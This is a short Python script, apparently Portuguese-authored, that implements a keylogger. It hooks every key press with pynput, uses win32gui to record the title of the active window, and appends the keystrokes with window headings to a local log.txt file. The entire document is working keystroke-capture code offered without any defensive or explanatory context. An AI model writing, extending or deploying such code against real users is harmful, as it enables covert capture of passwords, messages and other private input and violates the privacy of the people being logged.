from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow


LAST_WINDOW = None


def tecla_pressionada(tecla):
    global LAST_WINDOW
    with open("log.txt", "a") as log:
        window = GetWindowText(GetForegroundWindow())
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            log.write("\n\n#### {}\n".format(window))


        tecla = str(tecla)
        tecla=tecla.replace("'", "")
        tecla=tecla.replace("<65437>", "5")


        if len(tecla) > 1:
            tecla = " [{}] ".format(tecla)
       
        print(tecla)
        log.write(tecla)


with keyboard.Listener(on_press=tecla_pressionada) as Listener:
    Listener.join()


